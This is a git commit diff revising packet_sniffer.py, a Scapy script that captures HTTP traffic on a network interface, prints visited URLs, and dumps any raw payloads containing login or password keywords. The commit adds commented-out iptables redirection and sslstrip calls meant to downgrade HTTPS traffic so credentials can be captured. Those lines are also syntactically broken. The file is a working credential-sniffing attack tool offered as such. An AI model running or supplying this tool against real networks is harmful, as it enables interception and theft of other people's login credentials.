f220be522fa00b2535418c57f7a0c58cd15875e8
blackninja-codex <akshatpathak170901@gmail.com>
2023-03-16 15:08:03 +0530

    Tool

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,36 +1,39 @@
+#install libraries - scapy, scapy_http, sslstrip
 import scapy.all as scapy
 from scapy.layers import http
 import argparse
+# uncomment to work against https
+#import subprocess
+#subprocess.call(iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000)
+#subproces..call(sslstrip)
 
-def get_argument():
-	parser=argparse.ArgumentParser()
-	parser.add_argument("-i","--interface",dest="interface",help="Interface to sniff packet")
-	options=parser.parse_args()
-	return options
+parser=argparse.ArgumentParser()	
+parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
+options = parser.parse_args()
 
 def sniff(interface):
-	scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
+	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
 
-def get_url(packet):
+def geturl(packet):
 	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 def get_login_info(packet):
 	if packet.haslayer(scapy.Raw):
-			load=packet[scapy.Raw].load
-			keywords=["username","user","login","password","pass"]
-			for keyword in keywords:
-				if keyword in str(load):
-					return load 
+		load = packet[scapy.Raw].load
+		keywords = ['login','LOGIN','user','pass','username','password','Login', 'USERNAME', 'USER', 'PASS', 'PASSWORD']
+		for keyword in keywords:
+			if keyword in str(load):
+				return load
 
-def sniffed_packet(packet):
+def process_sniffed_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
-		url=get_url(packet)
-		print("HTTP Request "+str(url))
-		login_info=get_login_info(packet)
-		if login_info:
-			print("\n\n Possible username/password "+str(login_info)+"\n\n")
+		url=geturl(packet)
+		print("[+]HTTPRequest > "+ str(url))
+		logininfo = get_login_info(packet)
+		if logininfo:
+			print("\n\n[+]Possible username and password "+ str(logininfo) +"\n\n")
+sniff(options.interface)
+#Do ip --flush in terminal after program ends to clear ip table
 
-option=get_argument()
-sniff(option.interface)
 		
 
